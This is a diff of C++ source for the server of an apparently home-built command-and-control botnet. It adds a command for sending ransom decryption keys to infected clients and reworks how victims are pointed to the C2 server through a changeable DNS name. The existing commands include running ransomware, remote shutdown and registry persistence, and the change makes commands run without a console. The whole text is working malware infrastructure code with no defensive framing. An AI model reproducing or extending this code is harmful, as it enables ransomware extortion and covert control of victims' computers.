@@ -39,7 +39,8 @@ const std::map<Action, std::string> ServerCommands =
     { kRemoteShutdown,    "Shutdown the clients machine." },
     { kKillClient,        "Forcefully disconnect the client from the C2 server." },
     { kRansomwareEnable,  "Run ransomware on the client." },
-    { kAddToStartup,      "Add a program to the startup registry."}
+    { kAddToStartup,      "Add a program to the startup registry."},
+    { kSetAsDecryptionKey, "Send client decryption key for ransom."}
 };
 
 /*
@@ -195,7 +196,19 @@ void ServerInterface::ListenForUDPMessages() {
         if ( !received )
             continue;
         
-        PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
+        std::cout << "Received a message on the UDP socket" << std::endl;
+
+        // client wants to connect so respond with tcp server details
+        hostent* host = GetHostByName(DNS_NAME.c_str());
+
+        // server with ip inserted into addr for the client to connect to
+        // allows me to change the dns name to whatever i want, whenever
+        Server temp = this->m_TCPServerDetails;
+        memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
+
+        m_NetworkManager.TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incomingAddr);
+
+        //PerformRequest(req, this->m_UDPServerDetails, -1, incomingAddr);
     }
 }
 
@@ -349,24 +362,6 @@ bool ServerInterface::PerformRequest(const Packet& req, Server on, long cuid, so
         TCPClient = nullptr;
         success = true;
         break;
-    // connect client to tcp server on udp request
-    case Action::kAddClientToServer: 
-    {
-        if ( onTCP ) // already connected
-            break;
-
-        // client wants to connect so respond with tcp server details
-        hostent* host = GetHostByName(DNS_NAME.c_str());
-
-        // server with ip inserted into addr for the client to connect to
-        // allows me to change the dns name to whatever i want, whenever
-        Server temp = this->m_TCPServerDetails;
-        memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);
-
-        success = m_NetworkManager.TransmitData(temp, this->m_UDPServerDetails.sfd, UDP, incoming);
-
-        break;
-    }
     }
 
     return success;
@@ -580,6 +575,10 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
     cmdInfo.action = static_cast<Action>(command);
 
     switch ( command ) {
+    case Action::kSetAsDecryptionKey:
+        // todo convert rsa key from base64 saved from server state json for client
+        // convert to der, send it in buffer and send the size of the key in buffLen
+        break;
     case Action::kRansomwareEnable: {
         std::string input;
         std::string confirmation;
@@ -593,7 +592,7 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         if ( confirmation != "YES" )
             break;
 
-        cmdInfo.flags |= PACKET_IS_A_COMMAND;
+        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
         cmdInfo.insert(input);
 
         performed = true;
@@ -793,9 +792,16 @@ void ServerInterface::RunUserInputOnClients() {
             system("cls");
             continue;
         }
-         
+        
+        if ( globalCommand && lCommand == kSetAsDecryptionKey ) {
+            std::cout << "Can't send decryption keys to all clients at once. Do it manually. :(" << std::endl;
+            system("pause");
+            system("cls");
+            continue;
+        }
+
         Packet toSend;
-        BOOL userInput = HandleUserInput(lCommand, toSend); // fill packet with info
+        bool userInput = HandleUserInput(lCommand, toSend); // fill packet with info
         if ( !userInput ) {
             std::cout << "Error taking user input." << std::endl;
             system("pause");
@@ -825,14 +831,13 @@ void ServerInterface::RunUserInputOnClients() {
                     std::cout << "Recipient Machine GUID: " << host.GetMachineGUID() << std::endl;
                     std::cout << "Recipient Desktop Name: " << host.GetDesktopName() << std::endl;
                     std::cout << "Sent packet size:       " << encrypted.size() << " bytes" << std::endl;
+                    continue;
                 }
-                else
-                    performees++;
+                
+                performees++;
 
-                if ( toSend.action == kKillClient ) {
-                    Sleep(100);
+                if ( toSend.action == kKillClient )
                     RemoveClientFromServer(&host);
-                }
             }
             std::cout << "Performed command on " << std::to_string(performees) << " clients." << std::endl;
         }
